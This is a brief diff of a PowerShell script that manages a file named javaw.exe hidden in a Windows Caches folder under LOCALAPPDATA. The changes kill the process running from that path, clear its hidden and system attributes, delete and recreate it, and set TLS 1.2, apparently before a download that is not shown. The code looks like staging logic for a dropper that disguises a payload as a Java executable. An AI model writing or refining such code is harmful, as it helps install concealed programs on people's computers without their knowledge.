@@ -1,6 +1,7 @@
 $s = "$env:LOCALAPPDATA\Microsoft\Windows\Caches\javaw.exe"
-Stop-Process -Name javaw -Force -EA 0
-Set-ItemProperty $s Attributes Normal -Force -EA 0
+Get-Process javaw -EA 0 | Where-Object { $_.Path -like "*Caches*" } | Stop-Process -Force
+Start-Sleep -Milliseconds 300
+attrib -r -h -s $s 2>$null
 Remove-Item $s -Force -EA 0
 New-Item -ItemType Directory -Force -Path (Split-Path $s) | Out-Null
 [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
